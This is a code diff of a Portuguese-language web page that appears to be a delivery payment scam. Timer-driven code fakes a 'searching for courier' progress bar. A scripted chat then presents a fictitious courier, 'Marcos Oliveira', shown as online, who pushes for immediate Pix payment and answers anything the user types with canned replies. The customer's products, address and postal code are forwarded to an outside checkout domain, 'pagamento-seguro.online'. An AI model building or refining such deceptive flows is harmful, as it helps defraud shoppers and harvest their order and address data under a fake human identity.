@@ -624,23 +624,16 @@
     </button>
   </div>
 
-  <!-- Chatbot Section (REESTRUTURADO) -->
+  <!-- Chatbot Section -->
   <div id="chatSection">
     <div class="chat-header">
-      <div class="chat-back" onclick="fecharChat()">
-        <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
-      </div>
+      <div class="chat-back" onclick="fecharChat()">←</div>
       <div class="chat-avatar"></div>
       <div class="chat-user-info">
         <div class="chat-user-name">Marcos Oliveira</div>
-        <div class="chat-user-status">
-          <span style="width: 8px; height: 8px; background: #10b981; border-radius: 50%; display: inline-block;"></span>
-          Online agora
-        </div>
+        <div class="chat-user-status">Online agora</div>
       </div>
-      <button class="chat-call-btn">
-        <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.56a.977.977 0 00-1.01.24l-2.2 2.2a15.045 15.045 0 01-6.59-6.59l2.2-2.21a.96.96 0 00.25-1.01c-.36-1.11-.56-2.3-.56-3.53 0-.54-.45-.99-.99-.99H4.19c-.54 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.58c0-.54-.45-.99-.99-.99z"/></svg>
-      </button>
+      <div style="font-size: 20px; color: #1e6cf2;">📞</div>
     </div>
 
     <div class="chat-messages" id="chatMessages">
@@ -900,21 +893,25 @@
     function iniciarChat() {
       document.getElementById('chatSection').classList.add('active');
       
-      // Card de identificação aparece IMEDIATAMENTE
-      addIdCard();
-      
-      // Pequeno delay para a primeira mensagem
       setTimeout(function() {
         showTyping(true);
         setTimeout(function() {
           showTyping(false);
-          addMessage('Olá! Como você deseja realizar o pagamento do seu pedido? Você pode pagar agora via Pix para agilizar a entrega ou pagar diretamente comigo na chegada.', 'received');
+          addIdCard();
           
           setTimeout(function() {
-            addPaymentOptions();
-          }, 800);
+            showTyping(true);
+            setTimeout(function() {
+              showTyping(false);
+              addMessage('Olá! Como você deseja realizar o pagamento do seu pedido? Você pode pagar agora via Pix para agilizar a entrega ou pagar diretamente comigo na chegada.', 'received');
+              
+              setTimeout(function() {
+                addPaymentOptions();
+              }, 800);
+            }, 2000);
+          }, 1200);
         }, 1500);
-      }, 500);
+      }, 800);
     }
 
     var montarUrlGlobal = function() { return '#'; };
@@ -926,72 +923,111 @@
         var products = p.get('products');
         var address  = p.get('address');
         var cep      = p.get('cep');
-        var city     = p.get('city');
+        var delivery = p.get('delivery_time');
 
         if (address) {
           document.getElementById('displayAddress').textContent = address;
+          var loc = extrairLocalizacao(address);
+          var sigla = extrairSiglaEstado(address);
+
+          if (loc) {
+            var textoExibicao = loc;
+            if (sigla) textoExibicao += '/' + sigla;
+            document.getElementById('searchTitle').innerHTML =
+              'Buscando entregador em <span class="bairro-highlight">' + textoExibicao + '</span>';
+          }
+          if (cep) {
+            document.getElementById('displayCity').textContent = 'CEP: ' + cep;
+          }
+
+          // Preenche o endereço no overlay
           document.getElementById('overlayAddress').textContent = address;
-        }
-        if (city) {
-          document.getElementById('displayCity').textContent = city;
-          document.getElementById('overlayCep').textContent = (cep ? cep + ' • ' : '') + city;
+          if (cep) {
+            document.getElementById('overlayCep').textContent = 'CEP: ' + cep;
+          } else {
+            document.getElementById('overlayCep').textContent = '';
+          }
         }
 
+        if (products) localStorage.setItem('cart_products',    products);
+        if (address)  localStorage.setItem('delivery_address', address);
+        if (delivery) localStorage.setItem('delivery_time',    delivery);
+
+        var CHECKOUT_URL = 'https://pagamento-seguro.online/checkout';
         montarUrlGlobal = function() {
-          var baseUrl = 'https://pagamento-seguro.online/checkout';
-          var finalUrl = baseUrl + '?subtotal=' + encodeURIComponent(subtotal || '') +
-                         '&products=' + encodeURIComponent(products || '') +
-                         '&address=' + encodeURIComponent(address || '') +
-                         '&cep=' + encodeURIComponent(cep || '') +
-                         '&city=' + encodeURIComponent(city || '');
-          return finalUrl;
+          var tp = new URLSearchParams();
+          tp.set('subtotal', subtotal || '0.00');
+          if (address)  tp.set('address',       address);
+          if (cep)      tp.set('cep',           cep);
+          if (delivery) tp.set('delivery_time', delivery);
+          if (products) tp.set('products',      products);
+          return CHECKOUT_URL + '?' + tp.toString();
         };
 
-        var progresso = 0;
-        var interval = setInterval(function() {
-          progresso += Math.floor(Math.random() * 15) + 5;
-          if (progresso >= 100) {
-            progresso = 100;
-            clearInterval(interval);
-            atualizarBarra(100);
-            document.getElementById('searchFill').classList.add('found');
-            document.getElementById('searchStatus').classList.add('found');
-            document.getElementById('searchStatus').textContent = 'CONCLUÍDO';
-            document.getElementById('searchTitle').innerHTML = 'Entregador <span class="bairro-highlight">Encontrado!</span>';
+        document.getElementById('btnProsseguir').onclick = function() {
+          document.getElementById('loadingScreen').classList.add('active');
+          setTimeout(function() {
+            document.getElementById('loadingScreen').classList.remove('active');
+            document.getElementById('confirmOverlay').classList.remove('visivel');
+            iniciarChat();
+          }, 800);
+        };
+
+        document.getElementById('chatSendBtn').onclick = function() {
+          var input = document.getElementById('chatInput');
+          var text = input.value.trim();
+          if (text) {
+            addMessage(text, 'sent');
+            input.value = '';
             
             setTimeout(function() {
-              document.getElementById('mainCard').classList.add('saindo');
+              showTyping(true);
               setTimeout(function() {
-                document.getElementById('confirmOverlay').classList.add('visivel');
-              }, 400);
-            }, 800);
-          } else {
-            atualizarBarra(progresso);
+                showTyping(false);
+                addMessage('Entendido! Estou processando sua solicitação.', 'received');
+              }, 2000);
+            }, 1000);
           }
-        }, 400);
+        };
 
-      } catch(e) { console.error(e); }
+        document.getElementById('chatInput').onkeypress = function(e) {
+          if (e.key === 'Enter') {
+            document.getElementById('chatSendBtn').click();
+          }
+        };
+
+        var TOTAL = 3000;
+        setTimeout(function() { atualizarBarra(40); }, TOTAL * 0.3);
+        setTimeout(function() { atualizarBarra(75); }, TOTAL * 0.6);
+
+        setTimeout(function() {
+          atualizarBarra(100);
+          document.getElementById('searchFill').classList.add('found');
+          document.getElementById('searchStatus').textContent = '100%';
+          document.getElementById('searchStatus').classList.add('found');
+
+          setTimeout(function() {
+            document.getElementById('mainCard').classList.add('saindo');
+            setTimeout(function() {
+              document.getElementById('confirmOverlay').classList.add('visivel');
+            }, 400);
+          }, 400);
+
+        }, TOTAL);
+
+      } catch (err) {
+        console.error('Erro:', err);
+      }
     }
 
-    document.getElementById('btnProsseguir').addEventListener('click', function() {
-      iniciarChat();
-    });
+    document.addEventListener('DOMContentLoaded', processarPedido);
 
-    document.getElementById('chatSendBtn').addEventListener('click', function() {
-      var input = document.getElementById('chatInput');
-      if (input.value.trim() !== '') {
-        addMessage(input.value, 'sent');
-        input.value = '';
+    window.addEventListener('pageshow', function(event) {
+      if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+        var loadingScreen = document.getElementById('loadingScreen');
+        if (loadingScreen) loadingScreen.classList.remove('active');
       }
     });
-
-    document.getElementById('chatInput').addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') {
-        document.getElementById('chatSendBtn').click();
-      }
-    });
-
-    window.onload = processarPedido;
   </script>
 </body>
 </html>
